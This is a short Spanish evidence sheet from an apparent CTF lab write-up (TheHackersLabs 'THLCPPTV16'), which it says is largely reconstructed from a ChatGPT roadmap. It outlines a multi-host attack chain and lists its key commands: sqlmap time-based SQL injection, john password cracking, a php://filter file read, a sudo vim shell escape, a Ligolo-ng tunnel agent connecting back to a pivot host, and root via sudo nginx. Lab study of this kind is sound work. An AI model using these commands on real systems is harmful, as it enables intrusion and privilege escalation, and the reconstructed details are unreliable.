---
tags: [ctf, thehackerslabs, linux, evidencias]
tipo: evidencias
---

# THLCPPTV16 — Evidencias

> [!warning] Origen
> Documentado en `THLCPPTV16_CTF_Roadmap.md`. Contenido **reconstruido** salvo indicación.

## Originales

| # | Tipo | Descripción | Ruta | Origen |
|---|---|---|---|---|
| — | md | Roadmap multi-host | (documento ChatGPT, no en disco) | sesión original |

## Reconstrucciones

| # | Qué | Base |
|---|---|---|
| 1 | My Calendar SQLi time-based → hash Tom | roadmap |
| 2 | PHP filters + WrapWrap en 2º vhost | roadmap |
| 3 | alias SSH Tom→Rafael | roadmap |
| 4 | Ligolo-ng + WireGuard (topología) | roadmap |
| 5 | APT Pre-Invoke en Jerry | roadmap |
| 6 | `sudo nginx` root final | roadmap |

## Inferencias (no verificadas)

- La **topología exacta** (IPs de la red de pivote) no se conserva; el diagrama muestra la estructura lógica, no direcciones finales.

## Comandos clave reproducibles

```bash
sqlmap -u "<url My Calendar>" --technique=T --dbs
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
curl -s '...?page=php://filter/convert.base64-encode/resource=config.php' | base64 -d
sudo vim -c ':!/bin/sh'
# pivote
./proxy -selfcert -laddr 0.0.0.0:11601
./agent -connect 192.168.56.1:11601 -ignore-cert
sudo nginx -c /tmp/nginx.conf
```

## Artefactos generados

| Artefacto | Ruta | Notas |
|---|---|---|
| `hash.txt` | local | hash phpass de Tom |
| config nginx | `/tmp/nginx.conf` | para `sudo nginx` (limpiar) |
